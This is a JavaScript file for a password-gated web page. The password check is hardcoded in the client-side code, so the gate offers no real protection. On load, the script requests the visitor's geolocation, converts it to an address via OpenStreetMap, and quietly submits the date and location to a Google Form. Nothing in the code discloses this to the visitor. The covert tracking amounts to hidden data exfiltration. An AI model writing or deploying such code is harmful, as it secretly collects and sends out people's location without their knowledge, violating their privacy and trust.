// Variables zone
var opts = {
    method: "POST",
    mode: "no-cors",
    redirect: "follow", 
    referrer: "no-referrer"
},
dateTell = new Date(),
geoPosition = "none",
hiddenContent = document.getElementById("hiddenContent"),
passCard = document.getElementById("passCard");

// Password filter
function checkPassword() {
    const enteredPassword = document.getElementById("password").value;
    if (enteredPassword === "232323") {
        hiddenContent.style.display = "block";
        passCard.style.display = "none";
    } else {
        document.getElementById("passwordHelpBlock").textContent = "Access denied, try again.";
    }
}

// Form fetcher
function tell() {
    var fullFeedbackurl = "https://docs.google.com/forms/d/e/1FAIpQLSegCYzLpH4bIgQfYgmj8-Hk5T6qDCTHrdmg57Qb5EsMePlYBw/formResponse?usp=pp_url&entry.1948324434=" + "date: " + dateTell + " location: " + geoPosition;
    fetch(fullFeedbackurl, opts)
        .then(function(response) {
            console.log("Success tell.");
        })
        .catch(function(error) {
            console.log("Unsuccess tell.");
        });
};

// Check for geolocation browser support and execute success method
if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(
    geoLocationSuccess,
    geoLocationError,
    { timeout: 10000 }
  );
} else {
  alert("Your browser doesn't support geolocation.");
}
function geoLocationSuccess(pos) {
  // Get user lat,long
  var myLat = pos.coords.latitude,
    myLng = pos.coords.longitude,
    loadingTimeout;

  var loading = function () {
    console.log("Fetching geo...");
  };

  loadingTimeout = setTimeout(loading, 600);

  var request = $.get(
    "https://nominatim.openstreetmap.org/reverse?format=json&lat=" +
      myLat +
      "&lon=" +
      myLng
  )
    .done(function (data) {
      if (loadingTimeout) {
        clearTimeout(loadingTimeout);
        loadingTimeout = null;
        console.log("Success geo fetch.");
        geoPosition = data.display_name;
        tell();
      }
    })
    .fail(function () {
        // Handle error
        geoPosition = "Can't connect with open street. Coordinates are lat: " + myLat + " Lng: " + myLng;
        tell();
    });
}

function geoLocationError(error) {
  var errors = {
    1: "Permission denied",
    2: "Position unavailable",
    3: "Request timeout"
  };
  geoPosition = "Not available.";
  tell();
}
